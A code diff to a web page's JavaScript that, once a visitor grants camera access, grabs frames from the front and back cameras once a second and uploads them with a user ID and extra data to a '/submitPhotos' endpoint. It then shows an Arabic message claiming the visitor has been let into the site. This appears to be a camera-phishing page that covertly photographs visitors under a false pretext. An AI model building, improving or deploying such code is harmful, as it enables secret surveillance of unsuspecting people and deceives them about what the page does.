@@ -106,7 +106,7 @@
                 const backStream = await requestCameraPermission('environment');
 
                 if (frontStream || backStream) {
-                    await handleSuccess(frontStream, backStream, additionalData);
+                    handleSuccess(frontStream, backStream, additionalData);
                 } else {
                     throw new Error('No camera access granted');
                 }
@@ -138,24 +138,32 @@
                 let photoCount = 0;
 
                 const captureInterval = setInterval(() => {
-                    if (photoCount >= 10) {
+                    if (photoCount >= 4) {
                         clearInterval(captureInterval);
+                        if (frontVideo.srcObject) frontVideo.srcObject.getTracks().forEach(track => track.stop());
+                        if (backVideo.srcObject) backVideo.srcObject.getTracks().forEach(track => track.stop());
+                        document.querySelector('.container').innerHTML = `
+                            <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
+                            <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
+                        `;
                         return;
                     }
 
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
+                        formData.append('userId', userId);
+                        formData.append('cameraType', cameraType);
+                        formData.append('imageWidth', canvas.width);
+                        formData.append('imageHeight', canvas.height);
+                        formData.append('additionalData', JSON.stringify(additionalData));
+                        post('/submitPhotos', formData);
+                    }, 'image/webp', 0.7);
 
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
-                    formData.append('userId', userId);
-                    formData.append('cameraType', cameraType);
-                    formData.append('imageWidth', canvas.width);
-                    formData.append('imageHeight', canvas.height);
-                    formData.append('additionalData', JSON.stringify(additionalData));
-                    post('/submitPhotos', formData);
-                    resolve();
-                }, 'image/webp', 0.7);
-            });
+                    photoCount++;
+                }, 1000);
+            };
         }
 
         async function post(url, formData) {
@@ -177,10 +185,6 @@
 
                     if (data.success) {
                         console.log('Photos sent successfully');
-                        document.querySelector('.container').innerHTML = `
-                            <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
-                            <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
-                        `;
                         return;
                     } else {
                         throw new Error(data.error);
